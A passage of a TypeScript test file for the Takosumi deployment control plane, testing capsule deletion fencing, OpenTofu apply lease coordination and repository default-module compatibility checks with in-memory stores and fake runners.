import { expect, test } from "bun:test";

import { ACCOUNT_SESSION_COOKIE_NAME } from "../../../../accounts/service/src/account-session.ts";
import {
  handleControlRoute,
  type ControlPlaneOperations,
} from "../../../../accounts/service/src/control-routes.ts";
import { InMemoryAccountsStore } from "../../../../accounts/service/src/store.ts";
import { createTakosumiService } from "../../../../core/bootstrap.ts";
import type { RepositoryManifestDocument } from "takosumi-contract/repository-manifest";
import type { SourceBuildConfig } from "takosumi-contract/install-configs";
import type {
  OpenTofuApplyJob,
  OpenTofuApplyResult,
  OpenTofuCapsuleSourceFilesJob,
  OpenTofuDestroyJob,
  OpenTofuPlanJob,
  OpenTofuPlanResult,
  OpenTofuRunner,
  OpenTofuStableSourceTagResolutionJob,
  OpenTofuSourceSnapshotPresentationFileJob,
} from "../../../../core/domains/deploy-control/mod.ts";
import { applyExpectedGuardFromPlanRun } from "../../../../core/domains/deploy-control/mod.ts";
import {
  InMemoryCapsuleCoordination,
  type CapsuleCoordination,
} from "../../../../core/domains/deploy-control/capsule_lease.ts";
import { InMemoryOpenTofuControlStore } from "../../../../core/domains/deploy-control/store.ts";
import { ObjectKeyArtifactReferenceAllocator } from "../../../../core/adapters/storage/artifact-references.ts";
import {
  formatResourceShapeId,
  type ResourceShapeRecord,
} from "../../../../core/domains/resource-shape/records.ts";
import { createInMemoryResourceShapeStores } from "../../../../core/domains/resource-shape/stores.ts";
import {
  fakeProviderVault,
  FIXTURE_ARCHIVE_DIGEST,
  FIXTURE_CLOUDFLARE_MIRROR_EVIDENCE,
  FIXTURE_CLOUDFLARE_PROVIDER,
  seedCapsuleModel,
  seedProviderConnections,
} from "../../../helpers/deploy-control/model_fixture.ts";
import type {
  ApplyRun,
  PlanRun,
} from "@takosumi/internal/deploy-control-api";

const ORIGIN = "https://app.takosumi.test";
const PLAN_DIGEST =
  "sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef";
const LOCK_DIGEST =
  "sha256:abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789";
const STATE_DIGEST =
  "sha256:fedcba9876543210fedcba9876543210fedcba9876543210fedcba9876543210";

const REPOSITORY_INTERFACE_MANIFEST = {
  apiVersion: "takosumi.com/v2.1",
  kind: "Repository",
  install: {
    defaultModule: ".",
    modules: {
      ".": {
        inputs: [],
        interfaces: [
          {
            key: "launcher",
            name: "app.launcher",
            spec: {
              type: "interface.ui.surface",
              version: "1",
              document: {
                display: { title: "Open app" },
                launcher: true,
              },
              inputs: {
                url: {
                  source: "output",
                  outputName: "launch_url",
                  outputType: "url",
                },
              },
              access: {
                visibility: "workspace",
                resourceUriInput: "url",
              },
            },
            bindingRequests: [
              {
                key: "installer",
                subject: { source: "installing_principal" },
                permissions: ["ui.open"],
                delivery: { type: "none" },
              },
            ],
          },
          {
            key: "unbound-status",
            name: "app.unbound-status",
            spec: {
              type: "example.status",
              version: "1",
              document: { purpose: "binding-negative-control" },
              inputs: {
                state: { source: "literal", value: "available" },
              },
              access: { visibility: "workspace" },
            },
          },
        ],
      },
    },
  },
} satisfies RepositoryManifestDocument;

interface RecordingRunner extends OpenTofuRunner {
  readonly planJobs: OpenTofuPlanJob[];
  readonly applyJobs: OpenTofuApplyJob[];
  readonly destroyJobs: OpenTofuDestroyJob[];
  readonly stableTagJobs: OpenTofuStableSourceTagResolutionJob[];
  readonly presentationFileJobs: OpenTofuSourceSnapshotPresentationFileJob[];
  readonly capsuleSourceFileJobs: OpenTofuCapsuleSourceFilesJob[];
}

function recordingRunner(
  planResult: Partial<OpenTofuPlanResult> = {},
): RecordingRunner {
  const planJobs: OpenTofuPlanJob[] = [];
  const applyJobs: OpenTofuApplyJob[] = [];
  const destroyJobs: OpenTofuDestroyJob[] = [];
  const stableTagJobs: OpenTofuStableSourceTagResolutionJob[] = [];
  const presentationFileJobs: OpenTofuSourceSnapshotPresentationFileJob[] = [];
  const capsuleSourceFileJobs: OpenTofuCapsuleSourceFilesJob[] = [];
  return {
    planJobs,
    applyJobs,
    destroyJobs,
    stableTagJobs,
    presentationFileJobs,
    capsuleSourceFileJobs,
    plan: (job) => {
      planJobs.push(job);
      return Promise.resolve({
        planDigest: PLAN_DIGEST,
        planArtifact: {
          kind: "runner-local",
          ref: "runner-local://plan/tfplan",
          digest: PLAN_DIGEST,
          contentType: "application/vnd.opentofu.plan",
        },
        providerLockDigest: LOCK_DIGEST,
        requiredProviders: [FIXTURE_CLOUDFLARE_PROVIDER],
        providerInstallation: [FIXTURE_CLOUDFLARE_MIRROR_EVIDENCE],
        planResourceChanges: [],
        ...planResult,
      });
    },
    apply: (job) => {
      applyJobs.push(job);
      return Promise.resolve({
        outputs: {
          launch_url: {
            sensitive: false,
            value: "https://hello.takosumi.test",
          },
          admin_token: { sensitive: true, value: "secret-output-token" },
        } as never,
        stateDigest: STATE_DIGEST,
        rawOutputRef: job.rawOutputRef,
        providerInstallation: [FIXTURE_CLOUDFLARE_MIRROR_EVIDENCE],
      });
    },
    destroy: (job) => {
      destroyJobs.push(job);
      return Promise.resolve({
        providerInstallation: [FIXTURE_CLOUDFLARE_MIRROR_EVIDENCE],
      });
    },
    readCapsuleSourceFiles: (job) => {
      capsuleSourceFileJobs.push(job);
      return Promise.resolve([
        {
          path: "main.tf",
          text: `
terraform {
  required_providers {
    cloudflare = {
      source = "cloudflare/cloudflare"
    }
  }
}

resource "cloudflare_workers_script" "app" {
  account_id  = "fixture-account"
  script_name = "fixture-app"
  content     = "export default { fetch() { return new Response('ok') } }"
}

output "launch_url" {
  value = "https://hello.takosumi.test"
}
`,
        },
      ]);
    },
    resolveStableSourceTag: (job) => {
      stableTagJobs.push(job);
      return Promise.resolve({
        tag: "v2.4.0",
        commit: "1234567890abcdef1234567890abcdef12345678",
      });
    },
    readSourceSnapshotPresentationFile: (job) => {
      presentationFileJobs.push(job);
      return Promise.resolve({
        path: job.path,
        text: '{"kind":"CapsuleSourceOptions"}\n',
        digest:
          "sha256:1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef",
        sizeBytes: 32,
      });
    },
  };
}

function seedSession(
  store: InMemoryAccountsStore,
  subject = "user_test",
): string {
  const now = Date.now();
  store.saveAccount({
    subject,
    email: "user_test@example.test",
    displayName: "Route E2E User",
    createdAt: now,
    updatedAt: now,
  });
  const sessionId = `sess_real_operations_e2e_${subject}`;
  store.saveAccountSession({
    sessionId,
    subject,
    createdAt: now,
    expiresAt: now + 60_000,
  });
  return `${ACCOUNT_SESSION_COOKIE_NAME}=${sessionId}`;
}

function request(
  method: string,
  path: string,
  init: { readonly cookie?: string; readonly body?: unknown } = {},
): { readonly request: Request; readonly url: URL } {
  const url = new URL(`${ORIGIN}${path}`);
  const headers: Record<string, string> = {};
  if (init.cookie) headers.cookie = init.cookie;
  if (init.body !== undefined) headers["content-type"] = "application/json";
  return {
    request: new Request(url, {
      method,
      headers,
      ...(init.body !== undefined ? { body: JSON.stringify(init.body) } : {}),
    }),
    url,
  };
}

async function controlJson<T>(
  input: {
    readonly operations: ControlPlaneOperations;
    readonly store: InMemoryAccountsStore;
    readonly cookie: string;
    readonly method: string;
    readonly path: string;
    readonly body?: unknown;
  },
  expectedStatus: number,
): Promise<T> {
  const built = request(input.method, input.path, {
    cookie: input.cookie,
    ...(input.body !== undefined ? { body: input.body } : {}),
  });
  const response = await handleControlRoute({
    request: built.request,
    url: built.url,
    store: input.store,
    operations: input.operations,
  });
  expect(response).toBeDefined();
  if (response!.status !== expectedStatus) {
    const failureText = await response!.clone().text();
    throw new Error(
      `${input.method} ${input.path} expected ${expectedStatus}, got ${response!.status}: ${failureText}`,
    );
  }
  expect(response!.headers.get("server-timing")).toContain("tk_control_auth");
  expect(response!.headers.get("server-timing")).toContain(
    "tk_control_dispatch",
  );
  return (await response!.json()) as T;
}

function storeEligibleInstallConfig(url: string) {
  return {
    sourceSelector: { url, path: "legacy/policy-path" },
    store: {
      source: { url, path: "legacy/store-path" },
      order: 1,
      surface: "service",
      kind: "application",
      provider: "portable",
      suggestedName: "test-app",
      badge: { ja: "App", en: "App" },
      name: { ja: "Test app", en: "Test app" },
      description: { ja: "Fixture", en: "Fixture" },
    },
  };
}

async function seedQueuedNoStateCapsuleApply(
  store: InMemoryOpenTofuControlStore,
  input: {
    readonly workspaceId: string;
    readonly capsuleId: string;
    readonly planRunId: string;
    readonly applyRunId: string;
    readonly environment?: string;
  },
) {
  const seeded = await seedCapsuleModel(store, {
    workspaceId: input.workspaceId,
    capsuleId: input.capsuleId,
    sourceId: `src_${input.capsuleId}`,
    snapshotId: `snap_${input.capsuleId}`,
    installConfigId: `cfg_${input.capsuleId}`,
    environment: input.environment ?? "production",
  });
  const capsule = {
    ...seeded.capsule,
    installingPrincipalId: "user_test",
  };
  await store.putCapsule(capsule);
  const planRun: PlanRun = {
    id: input.planRunId,
    workspaceId: capsule.workspaceId,
    capsuleId: capsule.id,
    capsuleContext: {
      workspaceId: capsule.workspaceId,
      capsuleId: capsule.id,
      environment: capsule.environment,
    },
    capsuleCurrentStateVersionId: null,
    source: {
      kind: "git",
      url: seeded.source.url,
      commit: seeded.snapshot.resolvedCommit,
    },
    sourceSnapshotId: seeded.snapshot.id,
    sourceDigest: "sha256:source",
    operation: "create",
    runnerProfileId: "opentofu-default",
    variablesDigest: "sha256:variables",
    requiredProviders: [],
    status: "succeeded",
    policy: { status: "passed", reasons: [], checkedAt: 1 },
    policyDecisionDigest: "sha256:policy",
    planDigest: PLAN_DIGEST,
    planArtifact: {
      kind: "runner-local",
      ref: `runner-local://plan/${input.planRunId}`,
      digest: PLAN_DIGEST,
    },
    baseStateGeneration: 0,
    auditEvents: [],
    createdAt: 1,
    updatedAt: 1,
  };
  await store.putPlanRun(planRun);
  await store.putPlanRunInputs({
    planRunId: planRun.id,
    variables: {},
    generatedRoot: {
      files: { "main.tf": 'module "child" { source = "./module" }' },
      moduleFiles: [{ path: "main.tf", text: "# fixture module" }],
    },
  });
  const applyRun: ApplyRun = {
    id: input.applyRunId,
    planRunId: planRun.id,
    workspaceId: capsule.workspaceId,
    capsuleId: capsule.id,
    operation: "create",
    runnerProfileId: "opentofu-default",
    status: "queued",
    expected: applyExpectedGuardFromPlanRun(planRun),
    stateBackend: { kind: "managed", ref: "state" } as never,
    stateLock: { status: "pending", backendRef: "state" },
    auditEvents: [],
    createdAt: 1,
    updatedAt: 1,
  };
  await store.putApplyRun(applyRun);
  return { capsule, planRun, applyRun };
}

function applyRunner(input: {
  readonly jobs: OpenTofuApplyJob[];
  readonly apply?: (job: OpenTofuApplyJob) => Promise<OpenTofuApplyResult>;
}): OpenTofuRunner {
  return {
    plan: () => Promise.reject(new Error("not used")),
    apply: async (job) => {
      input.jobs.push(job);
      if (input.apply) return await input.apply(job);
      return {
        outputs: {},
        stateDigest: STATE_DIGEST,
        rawOutputRef: job.rawOutputRef,
      };
    },
  };
}

test("no-state Capsule DELETE returns 409 for owned or invalid Resource claims", async () => {
  const cases = [
    {
      name: "owned-observed-mismatch",
      phase: "Ready" as const,
      generation: 2,
      observedGeneration: 1,
      owner: (workspaceId: string, capsuleId: string) => ({
        kind: "Capsule" as const,
        id: capsuleId,
        workspaceId,
        installingPrincipalId: "user_test",
      }),
    },
    {
      name: "workspace-mismatch",
      phase: "Deleting" as const,
      generation: 1,
      observedGeneration: 1,
      owner: (_workspaceId: string, capsuleId: string) => ({
        kind: "Capsule" as const,
        id: capsuleId,
        workspaceId: "ws_wrong_owner",
        installingPrincipalId: "user_test",
      }),
    },
    {
      name: "corrupt-owner",
      phase: "Failed" as const,
      generation: 1,
      observedGeneration: 0,
      owner: (workspaceId: string, capsuleId: string) => ({
        kind: "Capsule" as const,
        id: capsuleId,
        workspaceId,
      }),
    },
  ];

  for (const item of cases) {
    const accountStore = new InMemoryAccountsStore();
    const cookie = seedSession(accountStore);
    const deployStore = new InMemoryOpenTofuControlStore();
    const resourceStores = createInMemoryResourceShapeStores();
    const { operations } = await createTakosumiService({
      role: "takosumi-api",
      runtimeEnv: { TAKOSUMI_DEV_MODE: "1" },
      opentofuControlStore: deployStore,
      resourceShapeStores: resourceStores,
    });
    const workspaceId = `ws_delete_fence_${item.name}`;
    const capsuleId = `cap_delete_fence_${item.name}`;
    const seeded = await seedCapsuleModel(deployStore, {
      workspaceId,
      capsuleId,
    });
    await deployStore.putCapsule({
      ...seeded.capsule,
      installingPrincipalId: "user_test",
    });
    const resourceId = formatResourceShapeId(
      workspaceId,
      "EdgeWorker",
      `resource-${item.name}`,
    );
    await resourceStores.resources.upsert({
      id: resourceId,
      spaceId: workspaceId,
      kind: "EdgeWorker",
      name: `resource-${item.name}`,
      managedBy: "portable_iac",
      spec: { name: `resource-${item.name}` },
      phase: item.phase,
      generation: item.generation,
      observedGeneration: item.observedGeneration,
      owner: item.owner(workspaceId, capsuleId),
      createdAt: seeded.capsule.createdAt,
      updatedAt: seeded.capsule.updatedAt,
    } as ResourceShapeRecord);

    const result = await controlJson<{
      readonly error: {
        readonly code: string;
        readonly details?: { readonly reason?: string };
      };
    }>(
      {
        operations,
        store: accountStore,
        cookie,
        method: "DELETE",
        path: `/api/v1/capsules/${capsuleId}`,
      },
      409,
    );

    expect(result.error).toMatchObject({
      code: "failed_precondition",
      details: { reason: "capsule_owned_resources_pending" },
    });
    expect((await deployStore.getCapsule(capsuleId))?.status).toBe("pending");
    expect(await resourceStores.resources.get(resourceId)).toBeDefined();
  }
});

test("default service coordination returns 409 while provider Apply holds the Capsule lease", async () => {
  const accountStore = new InMemoryAccountsStore();
  const cookie = seedSession(accountStore);
  const deployStore = new InMemoryOpenTofuControlStore();
  let applyEntered!: () => void;
  const entered = new Promise<void>((resolve) => {
    applyEntered = resolve;
  });
  let releaseApply!: () => void;
  const held = new Promise<void>((resolve) => {
    releaseApply = resolve;
  });
  const applyJobs: OpenTofuApplyJob[] = [];
  const { operations } = await createTakosumiService({
    role: "takosumi-api",
    runtimeEnv: { TAKOSUMI_DEV_MODE: "1" },
    opentofuControlStore: deployStore,
    opentofuRunner: applyRunner({
      jobs: applyJobs,
      apply: async (job) => {
        applyEntered();
        await held;
        return {
          outputs: {},
          stateDigest: STATE_DIGEST,
          rawOutputRef: job.rawOutputRef,
        };
      },
    }),
    artifactReferenceAllocator: new ObjectKeyArtifactReferenceAllocator(),
  });
  const seeded = await seedQueuedNoStateCapsuleApply(deployStore, {
    workspaceId: "ws_abandon_apply_first",
    capsuleId: "cap_abandon_apply_first",
    planRunId: "plan_abandon_apply_first",
    applyRunId: "apply_abandon_apply_first",
  });
  const applying = operations.dispatchQueuedRun({
    action: "apply",
    runId: seeded.applyRun.id,
    workspaceId: seeded.capsule.workspaceId,
  });
  await entered;

  let response: Response | undefined;
  try {
    const built = request(
      "DELETE",
      `/api/v1/capsules/${seeded.capsule.id}`,
      { cookie },
    );
    response = await handleControlRoute({
      request: built.request,
      url: built.url,
      store: accountStore,
      operations,
    });
    expect(response?.status).toBe(409);
    expect(await response?.json()).toMatchObject({
      error: {
        code: "failed_precondition",
        details: { reason: "capsule_owned_resources_pending" },
      },
    });
    expect((await deployStore.getCapsule(seeded.capsule.id))?.status).toBe(
      "pending",
    );
  } finally {
    releaseApply();
    await applying;
  }

  expect(applyJobs).toHaveLength(1);
  expect((await deployStore.getCapsule(seeded.capsule.id))?.status).toBe(
    "active",
  );
});

test("abandon wins both admission leases before a queued Apply rechecks destroyed status", async () => {
  const accountStore = new InMemoryAccountsStore();
  const cookie = seedSession(accountStore);
  const deployStore = new InMemoryOpenTofuControlStore();
  const innerCoordination = new InMemoryCapsuleCoordination();
  const acquiredScopes: string[] = [];
  const coordination: CapsuleCoordination = {
    acquireLease: async (input) => {
      acquiredScopes.push(input.scope);
      return await innerCoordination.acquireLease(input);
    },
    renewLease: (input) => innerCoordination.renewLease(input),
    releaseLease: (input) => innerCoordination.releaseLease(input),
  };
  const applyJobs: OpenTofuApplyJob[] = [];
  const { operations } = await createTakosumiService({
    role: "takosumi-api",
    runtimeEnv: { TAKOSUMI_DEV_MODE: "1" },
    opentofuControlStore: deployStore,
    opentofuRunner: applyRunner({ jobs: applyJobs }),
    capsuleCoordination: coordination,
    artifactReferenceAllocator: new ObjectKeyArtifactReferenceAllocator(),
  });
  const seeded = await seedQueuedNoStateCapsuleApply(deployStore, {
    workspaceId: "ws_abandon_first",
    capsuleId: "cap_abandon_first",
    planRunId: "plan_abandon_first",
    applyRunId: "apply_abandon_first",
    environment: "preview",
  });

  await controlJson(
    {
      operations,
      store: accountStore,
      cookie,
      method: "DELETE",
      path: `/api/v1/capsules/${seeded.capsule.id}`,
    },
    202,
  );
  expect(acquiredScopes).toEqual([
    `capsule:${seeded.capsule.id}:${seeded.capsule.environment}`,
    `capsule-resource-admission:${seeded.capsule.id}`,
  ]);
  expect((await deployStore.getCapsule(seeded.capsule.id))?.status).toBe(
    "destroyed",
  );

  await operations.dispatchQueuedRun({
    action: "apply",
    runId: seeded.applyRun.id,
    workspaceId: seeded.capsule.workspaceId,
  });

  expect(applyJobs).toHaveLength(0);
  expect((await deployStore.getApplyRun(seeded.applyRun.id))?.status).toBe(
    "failed",
  );
  expect((await deployStore.getCapsule(seeded.capsule.id))?.status).toBe(
    "destroyed",
  );
});

test("no-state Capsule DELETE rejects any runtime effect but permits pre-dispatch failure", async () => {
  const accountStore = new InMemoryAccountsStore();
  const cookie = seedSession(accountStore);
  const deployStore = new InMemoryOpenTofuControlStore();
  const { operations } = await createTakosumiService({
    role: "takosumi-api",
    runtimeEnv: { TAKOSUMI_DEV_MODE: "1" },
    opentofuControlStore: deployStore,
  });
  const unknown = await seedQueuedNoStateCapsuleApply(deployStore, {
    workspaceId: "ws_abandon_unknown",
    capsuleId: "cap_abandon_unknown",
    planRunId: "plan_abandon_unknown",
    applyRunId: "apply_abandon_unknown",
  });
  await deployStore.putApplyRun({
    ...unknown.applyRun,
    status: "failed",
    startedAt: 2,
    finishedAt: 3,
    updatedAt: 3,
    auditEvents: [
      {
        id: "audit_abandon_unknown",
        type: "apply.failed",
        at: 3,
        data: { providerDispatched: true },
      },
    ],
  });

  await controlJson(
    {
      operations,
      store: accountStore,
      cookie,
      method: "DELETE",
      path: `/api/v1/capsules/${unknown.capsule.id}`,
    },
    409,
  );
  expect((await deployStore.getCapsule(unknown.capsule.id))?.status).toBe(
    "pending",
  );

  const preDispatch = await seedQueuedNoStateCapsuleApply(deployStore, {
    workspaceId: "ws_abandon_predispatch",
    capsuleId: "cap_abandon_predispatch",
    planRunId: "plan_abandon_predispatch",
    applyRunId: "apply_abandon_predispatch",
  });
  await deployStore.putApplyRun({
    ...preDispatch.applyRun,
    status: "failed",
    startedAt: 4,
    finishedAt: 5,
    updatedAt: 5,
    auditEvents: [],
  });

  await controlJson(
    {
      operations,
      store: accountStore,
      cookie,
      method: "DELETE",
      path: `/api/v1/capsules/${preDispatch.capsule.id}`,
    },
    202,
  );
  expect((await deployStore.getCapsule(preDispatch.capsule.id))?.status).toBe(
    "destroyed",
  );

  const safe = await seedQueuedNoStateCapsuleApply(deployStore, {
    workspaceId: "ws_abandon_safe",
    capsuleId: "cap_abandon_safe",
    planRunId: "plan_abandon_safe",
    applyRunId: "apply_abandon_safe",
  });
  await deployStore.putApplyRun({
    ...safe.applyRun,
    status: "succeeded",
    startedAt: 6,
    finishedAt: 7,
    updatedAt: 7,
    auditEvents: [],
  });

  await controlJson(
    {
      operations,
      store: accountStore,
      cookie,
      method: "DELETE",
      path: `/api/v1/capsules/${safe.capsule.id}`,
    },
    409,
  );
  expect((await deployStore.getCapsule(safe.capsule.id))?.status).toBe(
    "pending",
  );
});

test("Store preflight resolves the repository default before exact compatibility while manual Git keeps explicit modulePath", async () => {
  const accountStore = new InMemoryAccountsStore();
  const cookie = seedSession(accountStore);
  const deployStore = new InMemoryOpenTofuControlStore();
  const runner = recordingRunner();
  const repositoryUrl =
    "https://git.example.com/example/repository-default.git";
  const hostPolicy = {
    id: "cfg_repo_default_host_policy",
    name: "repo-default-host-policy",
    sourceSelector: {
      url: "https://git.example.com/example/repository-default/",
      path: ".",
    },
    sourceBuild: {
      commands: [{ argv: ["bun", "install", "--frozen-lockfile"] }],
      outputs: ["node_modules/.ready"],
    },
    lifecycleActions: [
      {
        apiVersion: "takosumi.dev/v1alpha1" as const,
        kind: "command" as const,
        id: "repo-default-activate",
        phase: "post_apply" as const,
        executor: "runner" as const,
        command: ["bun", "run", "activate"],
        runnerCapability: "capsule.lifecycle.command.v1",
      },
    ],
    variableMapping: {},
    outputAllowlist: {},
    policy: {
      lifecycleActions: {
        allowedExecutors: ["runner" as const],
        allowedRunnerCapabilities: ["capsule.lifecycle.command.v1"],
      },
    },
    createdAt: "2026-06-06T00:00:00.000Z",
    updatedAt: "2026-06-06T00:00:00.000Z",
  };
  const { operations } = await createTakosumiService({
    role: "takosumi-api",
    runtimeEnv: { TAKOSUMI_DEV_MODE: "1" },
    opentofuControlStore: deployStore,
    opentofuRunner: runner,
    artifactReferenceAllocator: new ObjectKeyArtifactReferenceAllocator(),
    operatorInstallConfigs: [hostPolicy],
  });
  const seeded = await seedCapsuleModel(deployStore, {
    workspaceId: "ws_repo_default_preflight",
    capsuleId: "cap_repo_default_seed",
    installConfigId: "icfg_repo_default_base",
    sourceUrl: repositoryUrl,
    installConfig: {
      modulePath: ".",
    },
  });
  const digest = `sha256:${"c".repeat(64)}`;
  await deployStore.putSourceSnapshot({
    ...seeded.snapshot,
    repositoryManifest: {
      status: "present",
      digest,
      document: {
        apiVersion: "takosumi.com/v2.1",
        kind: "Repository",
        install: {
          defaultModule: "deploy/takoform",
          modules: {
            ".": { inputs: [] },
            "deploy/takoform": { inputs: [] },
          },
        },
      },
    },
  });

  const preview = await controlJson<{
    readonly repositoryInstallUx: {
      readonly status: "accepted";
      readonly installConfigId: string;
    };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/sources/${seeded.source.id}/compatibility-check`,
      body: {
        sourceSnapshotId: seeded.snapshot.id,
        capsuleName: "repo-default",
        compileInstallUx: true,
      },
    },
    201,
  );

  expect(runner.capsuleSourceFileJobs).toHaveLength(1);
  expect(runner.capsuleSourceFileJobs[0]?.modulePath).toBe("deploy/takoform");
  const derivedInstallConfig = await operations.capsules.getInstallConfig(
    preview.repositoryInstallUx.installConfigId,
  );
  expect(derivedInstallConfig.modulePath).toBe("deploy/takoform");
  expect(derivedInstallConfig.sourceSelector).toEqual({
    url: seeded.source.url,
    path: seeded.source.defaultPath,
  });
  expect(derivedInstallConfig.store).toBeUndefined();
  expect(derivedInstallConfig.sourceBuild).toEqual(hostPolicy.sourceBuild);
  expect(derivedInstallConfig.lifecycleActions).toEqual(
    hostPolicy.lifecycleActions,
  );

  const createdFromDerivedConfig = await controlJson<{
    readonly capsule: { readonly id: string; readonly installConfigId: string };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/workspaces/${seeded.workspace.id}/capsules`,
      body: {
        name: "repo-default-derived-create",
        environment: "production",
        sourceId: seeded.source.id,
        installConfigId: derivedInstallConfig.id,
      },
    },
    201,
  );
  const createdFromDerivedInstallConfig =
    await operations.capsules.getInstallConfig(
      createdFromDerivedConfig.capsule.installConfigId,
    );
  expect(createdFromDerivedInstallConfig.modulePath).toBe(
    "deploy/takoform",
  );

  const whitespaceDerivedConfig = await operations.capsules.putInstallConfig({
    ...derivedInstallConfig,
    id: "icfg_repo_default_whitespace",
    name: "repo-default-whitespace",
    modulePath: " deploy/takoform ",
  });
  const whitespaceModuleOverride = await controlJson<{
    readonly error: {
      readonly code: string;
      readonly details?: { readonly diagnosticCode?: string };
    };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/workspaces/${seeded.workspace.id}/capsules`,
      body: {
        name: "repo-default-whitespace-override",
        environment: "production",
        sourceId: seeded.source.id,
        installConfigId: whitespaceDerivedConfig.id,
        modulePath: "deploy/takoform",
      },
    },
    400,
  );
  expect(whitespaceModuleOverride.error).toMatchObject({
    code: "repository_install_ux_invalid",
    details: {
      diagnosticCode: "repository_install_ux_module_path_mismatch",
    },
  });

  const emptyDerivedConfig = await operations.capsules.putInstallConfig({
    ...derivedInstallConfig,
    id: "icfg_repo_default_empty",
    name: "repo-default-empty",
    modulePath: "",
  });
  const emptyDerivedModule = await controlJson<{
    readonly error: {
      readonly code: string;
      readonly details?: { readonly diagnosticCode?: string };
    };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/workspaces/${seeded.workspace.id}/capsules`,
      body: {
        name: "repo-default-empty-module",
        environment: "production",
        sourceId: seeded.source.id,
        installConfigId: emptyDerivedConfig.id,
      },
    },
    400,
  );
  expect(emptyDerivedModule.error).toMatchObject({
    code: "repository_install_ux_invalid",
    details: {
      diagnosticCode: "repository_install_ux_module_path_missing",
    },
  });

  await deployStore.putSourceSnapshot({
    ...seeded.snapshot,
    repositoryManifest: {
      status: "present",
      digest,
      document: {
        apiVersion: "takosumi.com/v2",
        kind: "Repository",
        install: {
          modules: {
            "deploy/first": { inputs: [] },
            "deploy/second": { inputs: [] },
          },
        },
      },
    },
  });
  const missingDefault = await controlJson<{
    readonly error: {
      readonly code: string;
      readonly details?: { readonly diagnosticCode?: string };
    };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/sources/${seeded.source.id}/compatibility-check`,
      body: {
        sourceSnapshotId: seeded.snapshot.id,
        capsuleName: "repo-default",
        compileInstallUx: true,
      },
    },
    400,
  );
  expect(missingDefault.error).toMatchObject({
    code: "repository_install_ux_invalid",
    details: {
      diagnosticCode: "repository_install_ux_default_module_missing",
    },
  });
  expect(runner.capsuleSourceFileJobs).toHaveLength(1);

  await deployStore.putSourceSnapshot({
    ...seeded.snapshot,
    repositoryManifest: {
      status: "present",
      digest,
      document: {
        apiVersion: "takosumi.com/v2.1",
        kind: "Repository",
        install: {
          defaultModule: "deploy/takoform",
          modules: {
            ".": { inputs: [] },
            "deploy/takoform": { inputs: [] },
          },
        },
      },
    },
  });
  await deployStore.putInstallConfig({
    ...seeded.installConfig,
    id: "icfg_repo_default_ambiguous",
    name: "repo-default-ambiguous",
  });
  const historicalSharedRowsIgnored = await controlJson<{
    readonly repositoryInstallUx: {
      readonly status: "accepted";
      readonly installConfigId: string;
    };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/sources/${seeded.source.id}/compatibility-check`,
      body: {
        sourceSnapshotId: seeded.snapshot.id,
        capsuleName: "repo-default",
        compileInstallUx: true,
      },
    },
    201,
  );
  expect(historicalSharedRowsIgnored.repositoryInstallUx.status).toBe(
    "accepted",
  );
  expect(runner.capsuleSourceFileJobs).toHaveLength(1);

  const missing = await seedCapsuleModel(deployStore, {
    workspaceId: seeded.workspace.id,
    sourceId: "src_repo_default_missing",
    snapshotId: "snap_repo_default_missing",
    capsuleId: "cap_repo_default_missing",
    installConfigId: "icfg_repo_default_unlisted",
    name: "repo-default-missing",
    sourceUrl: "https://git.example.com/example/unlisted.git",
  });
  await deployStore.putSourceSnapshot({
    ...missing.snapshot,
    repositoryManifest: {
      status: "present",
      digest,
      document: {
        apiVersion: "takosumi.com/v1",
        kind: "Repository",
        install: { modules: { "deploy/only": { inputs: [] } } },
      },
    },
  });
  const genericBase = await controlJson<{
    readonly repositoryInstallUx: {
      readonly status: "accepted";
      readonly installConfigId: string;
    };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/sources/${missing.source.id}/compatibility-check`,
      body: {
        sourceSnapshotId: missing.snapshot.id,
        capsuleName: "repo-default-missing",
        compileInstallUx: true,
      },
    },
    201,
  );
  expect(genericBase.repositoryInstallUx.status).toBe("accepted");
  expect(runner.capsuleSourceFileJobs).toHaveLength(2);

  await controlJson(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/sources/${seeded.source.id}/compatibility-check`,
      body: {
        sourceSnapshotId: seeded.snapshot.id,
        modulePath: "deploy/manual",
        installConfigId: seeded.installConfig.id,
      },
    },
    201,
  );
  expect(runner.capsuleSourceFileJobs[2]?.modulePath).toBe("deploy/manual");

  const manual = await seedCapsuleModel(deployStore, {
    workspaceId: "ws_manual_module_create",
    sourceId: "src_manual_module_create",
    capsuleId: "cap_manual_module_seed",
    installConfigId: "icfg_manual_module_base",
    sourceUrl: "https://git.example.com/example/manual-module.git",
    installConfig: { modulePath: "." },
  });
  const manualCreated = await controlJson<{
    readonly capsule: { readonly id: string; readonly installConfigId: string };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/workspaces/${manual.workspace.id}/capsules`,
      body: {
        name: "manual-module-selection",
        environment: "production",
        sourceId: manual.source.id,
        installConfigId: manual.installConfig.id,
        modulePath: "deploy/manual",
      },
    },
    201,
  );
  const manualConfig = await operations.capsules.getInstallConfig(
    manualCreated.capsule.installConfigId,
  );
  expect(manualConfig.modulePath).toBe("deploy/manual");
});

test("initial Plan and Apply keep the persisted repository sourceBuild after metadata changes", async () => {
  const accountStore = new InMemoryAccountsStore();
  const cookie = seedSession(accountStore);
  const deployStore = new InMemoryOpenTofuControlStore();
  const runner = recordingRunner();
  const { operations } = await createTakosumiService({
    role: "takosumi-api",
    runtimeEnv: { TAKOSUMI_DEV_MODE: "1" },
    opentofuControlStore: deployStore,
    opentofuRunner: runner,
    artifactReferenceAllocator: new ObjectKeyArtifactReferenceAllocator(),
  });
  const seeded = await seedCapsuleModel(deployStore, {
    workspaceId: "ws_repo_source_build_pin",
    capsuleId: "cap_repo_source_build_seed",
    installConfigId: "icfg_repo_source_build_base",
